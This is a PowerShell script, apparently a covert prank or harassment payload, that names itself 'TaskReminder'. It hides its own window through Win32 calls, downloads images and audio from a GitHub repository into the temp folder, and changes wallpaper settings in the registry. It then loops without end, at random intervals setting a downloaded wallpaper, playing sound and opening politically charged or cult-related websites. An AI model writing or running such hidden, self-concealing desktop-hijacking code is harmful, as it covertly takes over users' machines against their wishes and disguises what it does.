# ================= CONFIG =================
$BaseUrl = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"

$Sites = @{
    1 = "https://heavensgate.com/"
    2 = "https://action.aipac.org/aipac-pac-donate"
    3 = "https://www.palantir.com/platforms/gotham/"
    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
}

$MinSeconds  = 10
$MaxSeconds  = 120
$Volume      = 0.5
$AvoidRepeat = $true
$ShowConsole = $false   # set to $true when debugging (keeps the window visible)
# ==========================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Dir = Join-Path $env:TEMP "TaskReminder"
New-Item -ItemType Directory -Path $Dir -Force | Out-Null
$LogFile = Join-Path $Dir "log.txt"

function Log($m) {
    "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile
    if ($ShowConsole) { Write-Host $m }
}

# ---- Hide the terminal window hosting this script ----
# (hiding keeps the program running; closing the window would end it)
if (-not $ShowConsole) {
    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinHide {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]   public static extern IntPtr GetAncestor(IntPtr hWnd, uint flags);
    [DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int cmd);
}
"@ -ErrorAction Stop
        $c = [WinHide]::GetConsoleWindow()
        if ($c -ne [IntPtr]::Zero) {
            $root = [WinHide]::GetAncestor($c, 3)    # GA_ROOTOWNER = the visible terminal window
            if ($root -eq [IntPtr]::Zero) { $root = $c }
            [void][WinHide]::ShowWindow($root, 0)
            if ($root -ne $c) { [void][WinHide]::ShowWindow($c, 0) }
            Log "Window hidden"
        } else { Log "No console window found to hide" }
    } catch { Log "HIDE FAILED: $($_.Exception.Message)" }
}

Log "--- started. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion), apartment: $([Threading.Thread]::CurrentThread.GetApartmentState())"

# Only one copy at a time
$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
$PID | Out-File (Join-Path $Dir "pid.txt")

# Download assets (always refreshed so old cached copies never linger)
foreach ($i in 1..5) {
    foreach ($f in "image$i.jpg", "audio$i.wav") {
        $dest = Join-Path $Dir $f
        $tmp  = "$dest.tmp"
        try {
            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $tmp -ErrorAction Stop
            $len = (Get-Item $tmp).Length
            if ($len -lt 1000) { throw "file is only $len bytes (not a real file?)" }
            Move-Item $tmp $dest -Force
            Log "Downloaded $f ($len bytes)"
        } catch {
            Log "DOWNLOAD FAILED $BaseUrl/$f : $($_.Exception.Message)"
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
}

# Wallpaper support
$wpOk = $false
try {
    Add-Type @"
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int a, int b, string c, int d);
}
"@ -ErrorAction Stop
    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle "10"
    Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
    $wpOk = $true
} catch { Log "WALLPAPER SETUP FAILED: $($_.Exception.Message)" }

# Audio support
$player = $null
try {
    Add-Type -AssemblyName PresentationCore -ErrorAction Stop
    $player = New-Object System.Windows.Media.MediaPlayer
} catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }

# Main loop
$last = 0
while ($true) {
    do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
    $last = $x
    Log "Task $x"

    if ($wpOk) {
        try {
            $img = Join-Path $Dir "image$x.jpg"
            $r = [WP]::SystemParametersInfo(20, 0, $img, 3)
            if (-not $r) { Log "Wallpaper call returned 0 for $img" }
        } catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
    }

    if ($player) {
        try {
            $file = Join-Path $Dir "audio$x.wav"
            $player.Stop()
            $player.Close()
            $player = New-Object System.Windows.Media.MediaPlayer
            $player.Open([Uri]$file)
            $player.Volume = $Volume

            # wait up to 3s for the file to finish loading
            $t = 0
            while (-not $player.NaturalDuration.HasTimeSpan -and $t -lt 30) {
                Start-Sleep -Milliseconds 100
                $t++
            }

            if ($player.NaturalDuration.HasTimeSpan) {
                $player.Play()
                Log "Playing audio$x.wav ($([int]$player.NaturalDuration.TimeSpan.TotalSeconds)s)"
            } else {
                Log "AUDIO FAILED to load $file ($((Get-Item $file -ErrorAction SilentlyContinue).Length) bytes)"
            }
        } catch { Log "AUDIO FAILED: $($_.Exception.Message)" }
    }

    try { Start-Process $Sites[$x] -ErrorAction Stop }
    catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }

    Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
}
